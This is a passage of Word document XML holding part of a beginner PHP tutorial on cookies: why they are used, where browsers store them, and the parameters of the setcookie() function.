            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Why and when to use Cookies?</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00711644" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="48" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="49" w:author="Unknown">
        <w:r w:rsidRPr="00711644">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Http is a stateless protocol; cookies allow us to track the state of the application using small files stored on the user’s computer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="50" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="51" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>The path were the cookies are stored depends on the browser.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="52" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="53" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Internet Explorer usually stores them in Temporal Internet Files folder.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="54" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="55" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Personalizing the user experience – this is achieved by allowing users to select their preferences.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:ins w:id="56" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="57" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>The page requested that follow are personalized based on the set preferences in the cookies.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="58" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="59" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Tracking the pages visited by a user</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="60" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="61" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:b w:val="0"/>
            <w:bCs w:val="0"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Creating Cookies</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="62" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="63" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Let’s now look at the basic syntax used to create a cookie.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="64" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="65"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66"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67" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="68" w:author="Unknown">
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>setcookie</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>(</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>cookie_name</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t xml:space="preserve">, </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>cookie_value</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>, [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>expiry_time</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>], [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>cookie_path</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>], [domain], [secure], [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>httponly</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00206B25">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>]);</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F7F7F7"/>
        <w:wordWrap w:val="0"/>
        <w:spacing w:line="300" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="69"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70" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="71" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>?&gt;</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="72" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="73" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>HERE,</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="74" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="75" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>Php“setcookie</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>” is the PHP function used to create the cookie.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="76" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="77" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>“</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>cookie_name</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>” is the name of the cookie that the server will use when retrieving its value from the $_COOKIE array variable. It’s mandatory.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="78" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="79" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>“</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>cookie_value</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>” is the value of the cookie and its mandatory</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="80" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="81" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>“[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>expiry_time</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t xml:space="preserve">]” is optional; it can be used to set the expiry time for the cookie such as 1 hour. The time is set using the PHP </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>time(</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>) functions plus or minus a number of seconds greater than 0 i.e. time() + 3600 for 1 hour.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="82" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="83" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>“[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>cookie_path</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>]” is optional; it can be used to set the cookie path on the server. The forward slash “/” means that the cookie will be made available on the entire domain. Sub directories limit the cookie access to the subdomain.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00405338" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="80"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="84" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="85" w:author="Unknown">
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>“[</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>domain</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>]” is optional, it can be used to define the cookie access hierarchy i.e. </w:t>
        </w:r>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"http://www.cookiedomain/"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www.cookiedomain</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t>.com means entire domain while </w:t>
        </w:r>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"http://www.sub.cookiedomain.com/"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www.sub.cookiedomain.com</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
          </w:rPr>
          <w:t> limits the cookie access to </w:t>
        </w:r>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"http://www.sub.cookiedomain.com/"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www.sub.cookiedomain.com</w:t>
        </w:r>
        <w:r w:rsidRPr="00405338">
          <w:rPr>
